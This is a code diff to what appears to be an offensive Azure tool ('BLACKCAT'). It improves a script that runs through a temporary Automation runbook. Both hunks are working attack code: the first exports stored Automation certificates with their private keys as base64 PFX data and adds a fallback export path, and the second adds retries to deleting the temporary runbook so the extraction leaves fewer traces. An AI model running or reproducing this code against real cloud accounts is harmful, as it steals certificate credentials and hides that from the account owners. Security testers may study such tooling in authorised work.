@@ -156,12 +156,28 @@ foreach (`$cName in `$certNames) {
     try {
         `$cert = Get-AutomationCertificate -Name `$cName
         if (`$cert) {
-            `$bytes = `$cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, '$PfxPassword')
-            `$base64 = [Convert]::ToBase64String(`$bytes)
-            `$results += [PSCustomObject]@{
-                CertificateName = `$cName
-                Base64Data      = `$base64
-                Success         = `$true
+            # Try exporting directly with PFX password
+            `$bytes = `$null
+            try {
+                `$bytes = `$cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, '$PfxPassword')
+            } catch {
+                # Fallback: re-import into ephemeral cert collection or use EphemeralKeySet
+                try {
+                    `$raw = `$cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert)
+                    `$newCert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new(`$cert)
+                    `$bytes = `$newCert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, '$PfxPassword')
+                } catch {
+                    throw `$_.Exception.Message
+                }
+            }
+
+            if (`$bytes) {
+                `$base64 = [Convert]::ToBase64String(`$bytes)
+                `$results += [PSCustomObject]@{
+                    CertificateName = `$cName
+                    Base64Data      = `$base64
+                    Success         = `$true
+                }
             }
         }
     } catch {
@@ -259,12 +275,23 @@ Write-Output "===BLACKCAT_CERTS_START===`$json===BLACKCAT_CERTS_END==="
                         if ($runbookCreated) {
                             Write-Host "  [~] Cleaning up ephemeral runbook '$tempRunbook'..." -ForegroundColor White
                             $deleteRbUri = "{0}{1}/runbooks/{2}?api-version=2018-06-30" -f $sv.armUri, $accId, $tempRunbook
-                            try {
-                                Invoke-RestMethod -Uri $deleteRbUri -Headers $auth -Method DELETE -UserAgent $sv.userAgent | Out-Null
-                                $stats.CleanedUp++
-                                Write-Host "  [+] Ephemeral runbook deleted successfully." -ForegroundColor Green
-                            } catch {
-                                Write-Warning "  [-] Failed to delete ephemeral runbook: $($_.Exception.Message)"
+                            
+                            # Automation service requires a short settling delay before deleting a completed job's runbook
+                            $deleted = $false
+                            $retryDelete = 0
+                            while (-not $deleted -and $retryDelete -lt 4) {
+                                Start-Sleep -Seconds 5
+                                try {
+                                    Invoke-RestMethod -Uri $deleteRbUri -Headers $auth -Method DELETE -UserAgent $sv.userAgent | Out-Null
+                                    $deleted = $true
+                                    $stats.CleanedUp++
+                                    Write-Host "  [+] Ephemeral runbook deleted successfully." -ForegroundColor Green
+                                } catch {
+                                    $retryDelete++
+                                    if ($retryDelete -ge 4) {
+                                        Write-Warning "  [-] Failed to delete ephemeral runbook after retries: $($_.Exception.Message)"
+                                    }
+                                }
                             }
                         }
                     }
